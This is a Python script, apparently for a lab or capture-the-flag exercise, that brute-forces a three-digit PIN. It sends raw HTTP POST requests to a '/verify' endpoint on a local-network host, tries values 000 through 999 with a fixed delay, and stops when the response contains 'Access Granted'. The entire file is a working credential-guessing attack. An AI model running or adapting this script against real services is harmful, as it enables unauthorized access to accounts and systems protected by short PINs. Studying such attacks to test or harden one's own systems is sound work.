import socket
import time

HOST = '192.168.1.7'
PORT = 8888
DELAY = 1.2
#created a request
def create_request(pin):
    """Create an HTTP POST request for the given PIN."""
    pin_str = f"{pin:03d}"
    body = f"magicNumber={pin_str}"
    headers = (
        f"POST /verify HTTP/1.1\r\n"
        f"Host: {HOST}:{PORT}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    )
    return headers + body, pin_str
    #created a request response
def send_request(request):
    """Send the HTTP request and return the server response."""
    response = b""
    try:
        with socket.create_connection((HOST, PORT), timeout=5) as sock:
            sock.sendall(request.encode())
            while True:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                except socket.timeout:
                    break
    except socket.error as err:
        print(f"Socket error: {err}")
        return None
    return response

#Verifies if the server response confirms the correct PIN.
def check_response(response, pin_str):
    """Analyze the server response."""
    if response is None:
        print(f"Failed to receive response for PIN {pin_str}")
        return False
    
    decoded = response.decode(errors='ignore')
    
    if "Access Granted" in decoded:
        print(f"SUCCESS! PIN: {pin_str}")
        return True
    else:
        print(f"Trying PIN {pin_str}")
        return False
        
#Attempts to brute-force the correct 3-digit PIN by sending requests one by one.
def main():
    pin = 0
    while pin < 1000:
        request, pin_str = create_request(pin)
        response = send_request(request)
        
        if check_response(response, pin_str):
            print(f"Found correct PIN: {pin_str}")
            break
        
        time.sleep(DELAY)
        pin += 1

if __name__ == "__main__":
    main()